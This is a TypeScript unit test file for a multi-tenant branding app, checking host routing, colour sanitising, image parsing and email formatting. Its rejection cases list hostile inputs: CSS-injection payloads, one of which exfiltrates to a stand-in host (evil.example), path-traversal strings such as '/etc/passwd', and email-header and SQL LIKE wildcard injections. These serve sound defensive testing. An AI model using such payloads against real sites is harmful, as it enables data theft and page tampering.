/**
 * Unit tests for the Phase 3 pure logic. No database, no network.
 *
 * These cover the two functions where a quiet mistake has the widest blast
 * radius:
 *
 *   classifyHost  decides WHICH TENANT a request is for. Misread a host as
 *                 "apex" and you serve Prime PEO's own book to whoever asked;
 *                 misread the apex as a partner and multi-tenancy silently
 *                 stops working.
 *
 *   safeColor     is a CSS-injection boundary. Its output is interpolated into
 *                 `<style>{":root{...}"}</style>`, where React escapes `<` but
 *                 NOT `}` or `;`, because the content of a <style> element is
 *                 CSS rather than HTML.
 *
 * Run: npx tsx scripts/test-unit.mts
 */
import { describe, ok, equal, done } from "./lib/harness";
import { classifyHost, APEX_HOST } from "../lib/tenant/host";
import {
  parseBranding,
  brandingToCss,
  contrastRatio,
  logoUrl,
  __testables,
} from "../lib/tenant/branding";
import { imageInfo } from "../lib/tenant/image-size";
import { brandFor, formatFrom, houseBrand, inboxList, parseSender } from "../lib/tenant/email-brand";
import { landingBrand } from "../app/components/landing/landing-sections";
import { CONSOLE_EMAIL_RE, escapeLike } from "../lib/console/email-match";
import {
  slugifyStage,
  validateStageLabel,
  stageTone,
  defaultStage,
  selectableStages,
  PROTECTED_STAGE_SLUG,
  toStage,
  type Stage,
} from "../lib/console/stages";

const { safeColor, safePath, safeText, safeInt } = __testables;
const apex = APEX_HOST.split(":")[0]!;

// ===========================================================================
describe("classifyHost: hosts that must resolve to the HOUSE tenant");
// ===========================================================================
for (const h of [apex, `${apex}:3000`, `www.${apex}`, `WWW.${apex.toUpperCase()}`]) {
  equal(classifyHost(h).kind, "apex", `"${h}"`);
}
// Vercel-assigned hosts serve the house site. Without this a preview URL is
// read as a request for the tenant "prime-vintage-git-main-abc123".
for (const h of ["prime-vintage.vercel.app", "x-git-main-abc.vercel.app", "vercel.app"]) {
  equal(classifyHost(h).kind, "apex", `"${h}" (Vercel-assigned)`);
}
// Reserved labels are infrastructure. A tenant must never be able to claim a
// slug that shadows them, and tenants.slug alone cannot express that.
for (const label of ["www", "api", "admin", "console", "portal", "assets", "cdn", "staging", "mail"]) {
  equal(classifyHost(`${label}.${apex}`).kind, "apex", `"${label}." is reserved`);
}

// ===========================================================================
describe("classifyHost: hosts that must resolve to a PARTNER");
// ===========================================================================
const partners: [string, string][] = [
  [`acme.${apex}`, "acme"],
  [`acme.${apex}:3000`, "acme"],
  [`ACME.${apex}`, "acme"],
  [`  acme.${apex}  `, "acme"],
  [`a-b-c.${apex}`, "a-b-c"],
  [`p1.${apex}`, "p1"],
  [`ab.${apex}`, "ab"],
  [`${"a".repeat(63)}.${apex}`, "a".repeat(63)],
];
for (const [host, slug] of partners) {
  const r = classifyHost(host);
  ok(r.kind === "partner" && r.slug === slug, `"${host}" -> ${slug}`,
     r.kind === "partner" ? undefined : `got ${JSON.stringify(r)}`);
}

// ===========================================================================
describe("classifyHost: hosts that must be UNKNOWN, never a silent fallback");
// ===========================================================================
/*
  "unknown" has to be distinct from "apex". A typo'd or spoofed Host that fell
  back to the house tenant would serve the client's own leads to whoever sent
  it, so absence of a match must mean 404, not "default".
*/
for (const h of [null, undefined, "", "   ", ":3000"]) {
  equal(classifyHost(h as string).kind, "unknown", `${JSON.stringify(h)} (empty)`);
}
for (const h of ["evil.com", `acme.${apex}.evil.com`, "notourdomain.co.uk"]) {
  equal(classifyHost(h).kind, "unknown", `"${h}" (not our domain)`);
}
// Two labels deep: a wildcard TLS cert does not cover it, so treating it as a
// partner would promise what the certificate cannot deliver.
equal(classifyHost(`a.b.${apex}`).kind, "unknown", `"a.b.${apex}" (two labels)`);
// Below or above what tenants.slug can hold.
equal(classifyHost(`x.${apex}`).kind, "unknown", `1-char label (DB minimum is 2)`);
equal(classifyHost(`${"a".repeat(64)}.${apex}`).kind, "unknown", `64-char label (DNS max is 63)`);
for (const bad of ["under_score", "Ünicode", "-", "has space", "dot.dot"]) {
  equal(classifyHost(`${bad}.${apex}`).kind, "unknown", `"${bad}" is not a legal slug`);
}

// ===========================================================================
describe("safeColor: the CSS-injection boundary");
// ===========================================================================
for (const good of ["#fff", "#FFF", "#ff2d00", "#19233bff", " #fff "]) {
  ok(safeColor(good) !== undefined, `accepts ${JSON.stringify(good)}`);
}
equal(safeColor("#FF2D00"), "#ff2d00", "normalises case");

/*
  Every entry below is a working payload if the allowlist is relaxed. They are
  kept as literals rather than generated, so the file itself documents what is
  being defended against.
*/
const payloads: [unknown, string][] = [
  ["red}body{display:none}", "closes the rule and opens another"],
  ["#fff}html{opacity:0}", "hides the page"],
  ["red;background-image:url(https://evil.example/?c=1)", "exfiltrates on paint"],
  ["#fff;position:fixed", "appends a declaration"],
  ["url(https://evil.example)", "remote fetch"],
  ["rgb(255,0,0)", "parenthesised function"],
  ["oklch(0.7 0.1 20)", "parenthesised function"],
  ["var(--pv-ink)", "indirection"],
  ["expression(alert(1))", "legacy IE expression"],
  ["#fff/**/;x:y", "comment smuggling"],
  ["#gggggg", "non-hex digits"],
  ["#ff", "too short"],
  ["#ff2d0", "5 digits"],
  ["fff", "missing #"],
  ["transparent", "keyword"],
  ["currentColor", "keyword"],
  ["inherit", "keyword"],
  ["", "empty"],
  [null, "null"],
  [undefined, "undefined"],
  [123, "number"],
  [{}, "object"],
  [[], "array"],
];
for (const [payload, why] of payloads) {
  equal(safeColor(payload), undefined, `rejects ${JSON.stringify(payload)} (${why})`);
}

// ===========================================================================
describe("brandingToCss: output is structurally safe, whatever went in");
// ===========================================================================
/*
  Asserted as a PROPERTY of the output rather than by trusting safeColor: every
  emitted declaration must be one of ours, with a value that is a hex or a
  color-mix over a hex. This holds even if the regex is later weakened.
*/
const hostile = parseBranding(
  {
    companyName: "Acme",
    colors: {
      accent: "red}body{display:none}",
      ink: "#123456",
      dark: "url(https://evil.example)",
      accentPress: "#fff;x:y",
    },
  },
  "Fallback",
);
const css = brandingToCss(hostile);
ok(!css.includes("}"), "emits no closing brace");
ok(!css.includes("url("), "emits no url(");
ok(!css.includes("red"), "drops the rejected accent");
ok(!css.includes("evil"), "drops the rejected dark colour");
ok(css.includes("--pv-ink:#123456"), "keeps the one valid colour");
const SAFE_DECL =
  /^--pv-[a-z-]+:(#[0-9a-f]{3,8}|color-mix\(in oklab,#[0-9a-f]{3,8} \d+%,(white|black)\))$/;
for (const decl of css.split(";")) {
  ok(SAFE_DECL.test(decl), `declaration is a safe --pv-* value: ${JSON.stringify(decl)}`);
}

// An unbranded tenant must emit NOTHING, so the house palette stands rather
// than being overridden with empty values.
equal(brandingToCss(parseBranding({}, "Acme")), "", "unbranded tenant emits no CSS");
equal(brandingToCss(parseBranding({ colors: {} }, "Acme")), "", "colors:{} emits no CSS");
// Derived greys follow the ink, so a partner sets one colour and the family
// relationship in the brand guide survives.
const inked = brandingToCss(parseBranding({ colors: { ink: "#101820" } }, "A"));
ok(inked.includes("--pv-ink-soft:color-mix"), "derives ink-soft from ink");
ok(inked.includes("--pv-ink-muted:color-mix"), "derives ink-muted from ink");

// ===========================================================================
describe("parseBranding: coerces, never throws");
// ===========================================================================
/*
  A thrown error here would 500 a partner's whole portal over one bad field, so
  every input must degrade to the house default instead.
*/
for (const raw of [null, undefined, [], 42, "nope", true, {}, { colors: "red" }, { logo: 7 }]) {
  let threw = false;
  let name = "";
  try {
    name = parseBranding(raw, "House Co").companyName ?? "";
  } catch {
    threw = true;
  }
  ok(!threw && name === "House Co",
     `${JSON.stringify(raw)} degrades to the tenant name`,
     threw ? "it threw" : `companyName was ${JSON.stringify(name)}`);
}
equal(parseBranding({}, "Acme Brokers").companyName, "Acme Brokers",
      "an unbranded tenant renders its own name, not the house brand");
equal(parseBranding({ companyName: "  Acme  " }, "X").companyName, "Acme", "trims");
equal(parseBranding({ companyName: "a".repeat(200) }, "X").companyName, "X",
      "over-long name falls back rather than breaking the header");
equal(parseBranding({ supportEmail: "not-an-email" }, "X").supportEmail, undefined,
      "rejects a malformed support email");
equal(parseBranding({ supportEmail: "ops@acme.com" }, "X").supportEmail, "ops@acme.com",
      "keeps a valid support email");

// ===========================================================================
describe("logo: all three dimensions or none, and no third-party origins");
// ===========================================================================
equal(parseBranding({ logo: { path: "a/b.png" } }, "X").logo, undefined,
      "a logo without width/height is dropped (it would shift the header)");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40 } }, "X").logo?.path,
      "a/b.png", "a complete logo survives");
equal(parseBranding({ logo: { path: "a/b.png", width: 200, height: 40, displayHeight: 999 } }, "X")
        .logo?.displayHeight, undefined, "an out-of-range displayHeight is dropped");
/*
  safePath is why branding.logo.path is a BUCKET PATH and not a URL: a branding
  row must not be able to point a partner's header at an origin the client does
  not control.
*/
for (const bad of [
  "https://evil.example/logo.png",
  "//evil.example/logo.png",
  "/etc/passwd",
  "../../secret.png",
  "a/../../b.png",
  "data:image/svg+xml;base64,AAAA",
]) {
  equal(safePath(bad), undefined, `safePath rejects ${JSON.stringify(bad)}`);
}
equal(safePath("tenants/acme/logo.png"), "tenants/acme/logo.png", "accepts a plain bucket path");
ok(logoUrl("tenants/acme/logo.png").includes("/storage/v1/object/public/tenant-logos/"),
   "logoUrl resolves a bucket path against the public storage endpoint");

// ===========================================================================
describe("safeText / safeInt bounds");
// ===========================================================================
equal(safeText("  hi  ", 10), "hi", "safeText trims");
equal(safeText("", 10), undefined, "safeText rejects empty");
equal(safeText("abc", 2), undefined, "safeText enforces max length");
equal(safeText(42, 10), undefined, "safeText rejects a non-string");
equal(safeInt(20, 16, 48), 20, "safeInt accepts in range");
equal(safeInt(15, 16, 48), undefined, "safeInt rejects below min");
equal(safeInt(49, 16, 48), undefined, "safeInt rejects above max");
equal(safeInt(Number.NaN, 16, 48), undefined, "safeInt rejects NaN");
equal(safeInt(Infinity, 16, 48), undefined, "safeInt rejects Infinity");
equal(safeInt("20", 16, 48), 20, "safeInt coerces a numeric string");

// ===========================================================================
describe("contrastRatio: the branding form's accessibility gate");
// ===========================================================================
equal(Math.round(contrastRatio("#ffffff", "#000000")), 21, "black on white is 21:1");
equal(contrastRatio("#ffffff", "#ffffff"), 1, "a colour against itself is 1:1");
ok(Math.abs(contrastRatio("#000", "#fff") - contrastRatio("#fff", "#000")) < 1e-9,
   "is symmetric");
// globals.css documents the house orange as failing AA for body text, which is
// why it is restricted to large text and the mark. A partner should be held to
// at least the same standard.
const orange = contrastRatio("#ff2d00", "#ffffff");
ok(orange > 3 && orange < 4.5,
   `the house orange sits between 3:1 and 4.5:1 on white (${orange.toFixed(2)})`);
ok(contrastRatio("#19233b", "#ffffff") > 4.5, "navy on white passes AA");
// A pale accent is exactly the palette the form must refuse.
ok(contrastRatio("#ffe9a8", "#ffffff") < 3, "a pale yellow accent is under 3:1 and must be refused");

// ===========================================================================
describe("stage helpers (Phase 2, re-checked because Phase 3 seeds them per tenant)");
// ===========================================================================
/*
  provision-tenant.mts seeds these four slugs for every new partner, and
  submissions_default_stage() raises if a tenant has none. So the slug rules
  are now load-bearing for partner onboarding, not just the admin screen.
*/
equal(slugifyStage("In Progress"), "in-progress", "slugify lowercases and hyphenates");
equal(slugifyStage("  Closed  "), "closed", "slugify trims");
equal(PROTECTED_STAGE_SLUG, "new",
      "the protected slug is 'new', matching the 0001 column default");
/*
  Built through toStage() from the raw DB row shape rather than hand-written as
  Stage objects. That way this fixture also exercises the row -> Stage mapping
  the server actually performs, so a column rename in a migration surfaces here
  rather than at runtime.
*/
const stages: Stage[] = [
  { id: "1", slug: "new", label: "New", sort_order: 10, is_default: true, is_terminal: false, tone: "neutral", retired_at: null },
  { id: "2", slug: "closed", label: "Closed", sort_order: 40, is_default: false, is_terminal: true, tone: "positive", retired_at: null },
  { id: "3", slug: "old", label: "Old", sort_order: 50, is_default: false, is_terminal: false, tone: "neutral", retired_at: "2026-01-01T00:00:00Z" },
].map(toStage);

equal(stages[0]!.isDefault, true, "toStage maps is_default -> isDefault");
equal(stages[2]!.retired, true, "toStage maps a non-null retired_at -> retired");
equal(defaultStage(stages)?.slug, "new", "defaultStage finds the default stage");
equal(selectableStages(stages).length, 2, "selectableStages excludes the retired stage");
ok(stageTone("nonexistent", stages) !== undefined,
   "an unknown slug still yields a Badge variant rather than an unstyled badge");

// validateStageLabel returns a message string, or "" when the label is fine.
ok(validateStageLabel("New", stages) !== "", "a duplicate stage label is rejected");
equal(validateStageLabel("Qualified", stages), "", "a fresh stage label is accepted");
ok(validateStageLabel("", stages) !== "", "an empty stage label is rejected");
ok(validateStageLabel("x".repeat(61), stages) !== "", "an over-long stage label is rejected");
// A rename must not collide with itself.
equal(validateStageLabel("New", stages, { ignoreId: "1" }), "",
      "renaming a stage to its own current label is allowed");

// ===========================================================================
describe("imageInfo: type by magic bytes, size from the container header");
// ===========================================================================
/*
  Fixtures are hand-built headers, not real files: the parser reads only the
  first ~30 bytes, and a fixture that shows those bytes is a better spec than
  a binary blob. Each one mirrors the layout described in image-size.ts.
*/
function pngHeader(w: number, h: number): Uint8Array {
  const b = new Uint8Array(33);
  b.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 0);
  b.set([0, 0, 0, 13], 8);
  b.set([0x49, 0x48, 0x44, 0x52], 12); // IHDR
  new DataView(b.buffer).setUint32(16, w, false);
  new DataView(b.buffer).setUint32(20, h, false);
  return b;
}
function riff(chunk: string, body: Uint8Array): Uint8Array {
  const b = new Uint8Array(20 + body.length + 12);
  b.set([0x52, 0x49, 0x46, 0x46], 0); // RIFF
  b.set([0x57, 0x45, 0x42, 0x50], 8); // WEBP
  for (let i = 0; i < 4; i++) b[12 + i] = chunk.charCodeAt(i);
  b.set(body, 20);
  return b;
}
function vp8(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  body.set([0x9d, 0x01, 0x2a], 3); // start code
  body[6] = w & 0xff; body[7] = (w >> 8) & 0x3f;
  body[8] = h & 0xff; body[9] = (h >> 8) & 0x3f;
  return riff("VP8 ", body);
}
function vp8l(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  body[0] = 0x2f;
  const bits = (w - 1) | ((h - 1) << 14);
  body[1] = bits & 0xff; body[2] = (bits >> 8) & 0xff; body[3] = (bits >> 16) & 0xff; body[4] = (bits >>> 24) & 0xff;
  return riff("VP8L", body);
}
function vp8x(w: number, h: number): Uint8Array {
  const body = new Uint8Array(12);
  const cw = w - 1, ch = h - 1;
  body[4] = cw & 0xff; body[5] = (cw >> 8) & 0xff; body[6] = (cw >> 16) & 0xff;
  body[7] = ch & 0xff; body[8] = (ch >> 8) & 0xff; body[9] = (ch >> 16) & 0xff;
  return riff("VP8X", body);
}

equal(JSON.stringify(imageInfo(pngHeader(640, 120))), JSON.stringify({ kind: "png", width: 640, height: 120 }), "PNG IHDR");
equal(JSON.stringify(imageInfo(vp8(300, 90))), JSON.stringify({ kind: "webp", width: 300, height: 90 }), "WebP lossy (VP8)");
equal(JSON.stringify(imageInfo(vp8l(512, 128))), JSON.stringify({ kind: "webp", width: 512, height: 128 }), "WebP lossless (VP8L)");
equal(JSON.stringify(imageInfo(vp8x(1000, 250))), JSON.stringify({ kind: "webp", width: 1000, height: 250 }), "WebP extended (VP8X)");

equal(imageInfo(new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"></svg>')), null,
      "SVG is rejected whatever the upload claims to be");
equal(imageInfo(new Uint8Array([0xff, 0xd8, 0xff, 0xe0, ...new Array(40).fill(0)])), null, "JPEG is rejected");
equal(imageInfo(pngHeader(640, 120).subarray(0, 20)), null, "a truncated PNG header is rejected, not read past the end");
equal(imageInfo(pngHeader(0, 120)), null, "a zero dimension is rejected");
equal(imageInfo(pngHeader(4001, 120)), null, "a dimension above parseBranding's 4000 cap is rejected here too");
{
  const bad = vp8(300, 90);
  bad[24] = 0x00; // break the start code
  equal(imageInfo(bad), null, "a VP8 chunk without its start code is rejected");
}
equal(imageInfo(riff("ALPH", new Uint8Array(12))), null, "an unexpected first WebP chunk is rejected");

// ===========================================================================
describe("email brand: one verified sender, the tenant's name on it");
// ===========================================================================
equal(JSON.stringify(parseSender("Prime PEO Brokers <notifications@primevantagehcm.com>")),
      JSON.stringify({ name: "Prime PEO Brokers", address: "notifications@primevantagehcm.com" }),
      "Name <addr> is split");
equal(parseSender("notifications@primevantagehcm.com").address, "notifications@primevantagehcm.com",
      "a bare address is kept");
equal(parseSender("notifications@primevantagehcm.com").name, "Prime PEO Brokers",
      "a bare address gets the house display name");
equal(parseSender(undefined).address, "onboarding@resend.dev", "unset falls back to the Resend onboarding sender");
equal(parseSender('"Quoted Name" <a@b.co>').name, "Quoted Name", "a quoted display name is unquoted");

const sender = parseSender("Prime PEO Brokers <notifications@primevantagehcm.com>");
equal(formatFrom("Acme Brokers", sender), '"Acme Brokers" <notifications@primevantagehcm.com>',
      "the partner's name goes on the house address");
equal(formatFrom('Acme "The Best" <Brokers>\r\nBcc: x', sender),
      '"Acme The Best Brokers Bcc: x" <notifications@primevantagehcm.com>',
      "quotes, angle brackets and line breaks cannot escape the display name");
equal(formatFrom("   ", sender), '"Prime PEO Brokers" <notifications@primevantagehcm.com>',
      "an empty name falls back to the sender's own");

{
  const partner = brandFor({
    slug: "acme",
    name: "Acme Brokers LLC",
    isHouse: false,
    branding: parseBranding(
      {
        companyName: "Acme Brokers",
        supportEmail: "ops@acme.com",
        colors: { accent: "#0055aa", ink: "#101820" },
        logo: { path: "t/logo.png", width: 400, height: 100 },
      },
      "Acme Brokers LLC",
    ),
  });
  equal(partner.isHouse, false, "a partner brand is not the house");
  equal(partner.name, "Acme Brokers", "display name comes from branding.companyName");
  equal(partner.replyTo, "ops@acme.com", "reply-to is the partner's contact address");
  equal(partner.accent, "#0055aa", "accent is the validated hex");
  equal(partner.ink, "#101820", "ink is the validated hex");
  ok(partner.origin.startsWith("http") && partner.origin.includes("acme."),
     "origin is the partner's own subdomain");
  ok(!!partner.logo && partner.logo.url.includes("/tenant-logos/t/logo.png") && partner.logo.width === 400,
     "logo resolves through logoUrl with its intrinsic size");

  const bare = brandFor({ slug: "bare", name: "Bare Co", isHouse: false, branding: parseBranding({}, "Bare Co") });
  equal(bare.name, "Bare Co", "an unbranded partner is named by its tenant name");
  equal(bare.replyTo, undefined, "no contact address means no reply-to, not the house inbox");
  equal(bare.logo, undefined, "no logo means a text-only header");
  equal(bare.accent, undefined, "no colours means house tokens");
}
equal(brandFor(null).isHouse, true, "no tenant degrades to the house brand");
equal(brandFor({ slug: "x", name: "X", isHouse: true, branding: {} }).name, "Prime PEO Brokers",
      "the house tenant is always the house brand, whatever its row says");
ok(houseBrand().logo?.url.endsWith("/brand/email-mark.png") === true, "the house mark is the hosted PNG");

// LEAD_NOTIFY_EMAIL as a list. Production had two addresses joined by a comma
// and Resend 422d every send that carried the raw string, as `to` or as
// `reply_to`. The list must reach Resend as an array, and reply-to as one address.
equal(JSON.stringify(inboxList("admin@x.com,garrett@x.com")), JSON.stringify(["admin@x.com", "garrett@x.com"]),
      "a comma-joined inbox list splits into addresses");
equal(JSON.stringify(inboxList(" a@x.com ; b@x.com\nc@x.com ")), JSON.stringify(["a@x.com", "b@x.com", "c@x.com"]),
      "semicolons, whitespace and newlines also separate");
equal(JSON.stringify(inboxList("a@x.com,,not-an-address")), JSON.stringify(["a@x.com"]), "junk entries are dropped");
equal(JSON.stringify(inboxList("")), "[]", "empty means no inbox");
equal(JSON.stringify(inboxList(undefined)), "[]", "unset means no inbox");
{
  const prev = process.env.LEAD_NOTIFY_EMAIL;
  process.env.LEAD_NOTIFY_EMAIL = "admin@x.com,garrett@x.com";
  equal(houseBrand().replyTo, "admin@x.com", "house reply-to is the first inbox, never the joined string");
  process.env.LEAD_NOTIFY_EMAIL = "";
  equal(houseBrand().replyTo, undefined, "no inbox means no reply-to");
  if (prev === undefined) delete process.env.LEAD_NOTIFY_EMAIL; else process.env.LEAD_NOTIFY_EMAIL = prev;
}


// ---------------------------------------------------------------------------
describe("landing page: what a partner's own marketing page must not say");
// ---------------------------------------------------------------------------
// The house page and a partner page are one component. Getting these wrong
// puts Prime's inbox, Prime's name or Prime's licensing claim on a domain
// belonging to someone else, which is the whole point of the white-label.

{
  const house = landingBrand(null);
  equal(house.brandName, "Prime PEO Brokers", "the house route keeps the house name");
  equal(house.contactEmail, "admin@primepeobrokers.com", "the house route keeps the house inbox");
  ok(house.showPartnerSection, "the house site still recruits partners");
  ok(!house.isPartner, "a null tenant is not a partner");
}

{
  // The house TENANT (resolved on the apex), not just the null route.
  const b = landingBrand({ isHouse: true, name: "Prime PEO Brokers", branding: {} });
  equal(b.brandName, "Prime PEO Brokers", "the house tenant renders as the house");
  ok(b.showPartnerSection, "the house tenant still recruits partners");
}

{
  const b = landingBrand({
    isHouse: false,
    name: "Acme Advisors",
    branding: { companyName: "Acme Benefits", supportEmail: "hello@acme.com" },
  });
  equal(b.brandName, "Acme Benefits", "a partner is named by branding.companyName");
  equal(b.contactEmail, "hello@acme.com", "a partner's visitors reach the PARTNER, not Prime");
  ok(!b.showPartnerSection, "a partner site does not recruit partners for Prime");
  ok(b.isPartner, "a non-house tenant is a partner");
}

{
  // The onboarding case: a partner created minutes ago, nothing filled in.
  const b = landingBrand({ isHouse: false, name: "Acme Advisors", branding: {} });
  equal(b.brandName, "Acme Advisors", "an unbranded partner falls back to its tenant name");
  equal(b.contactEmail, "admin@primepeobrokers.com",
        "no supportEmail means Prime's inbox, never a dead mailto");
  ok(!b.showPartnerSection, "an unbranded partner still does not recruit partners");
}

// ---------------------------------------------------------------------------
describe("console email matching: no LIKE wildcards reach a query");
// ---------------------------------------------------------------------------
// An address from the Partners form lands in a PostgREST .ilike() filter,
// where `%` and `_` are wildcards. `%@partner.com` would match an arbitrary
// other user on the tenant and mail THEM a working sign-in link.

ok(CONSOLE_EMAIL_RE.test("ops@partner.com"), "an ordinary address is accepted");
ok(CONSOLE_EMAIL_RE.test("first.last+tag@sub.partner.co"), "dots and plus tags are accepted");
ok(!CONSOLE_EMAIL_RE.test("%@partner.com"), "a bare % local part is refused");
ok(!CONSOLE_EMAIL_RE.test("ops%@partner.com"), "% anywhere in the local part is refused");
ok(!CONSOLE_EMAIL_RE.test("_@partner.com"), "a bare _ local part is refused");
ok(!CONSOLE_EMAIL_RE.test("ops@%.com"), "% in the domain is refused");
ok(!CONSOLE_EMAIL_RE.test("ops@partner.c%m"), "% in the TLD is refused");
ok(!CONSOLE_EMAIL_RE.test("not-an-address"), "a string with no @ is still refused");
ok(!CONSOLE_EMAIL_RE.test("ops@partner"), "a domain with no dot is still refused");

equal(escapeLike("ops@partner.com"), "ops@partner.com", "an ordinary address passes through unchanged");
equal(escapeLike("%@partner.com"), "\\%@partner.com", "% is escaped");
equal(escapeLike("a_b@partner.com"), "a\\_b@partner.com", "_ is escaped");
equal(escapeLike("a%b_c"), "a\\%b\\_c", "every wildcard in one string is escaped");
// The backslash must be escaped FIRST, or escaping % would emit a backslash
// that the next replacement consumes, re-opening the hole.
equal(escapeLike("a\\%b"), "a\\\\\\%b", "a literal backslash is escaped before the wildcards");

done("test-unit");
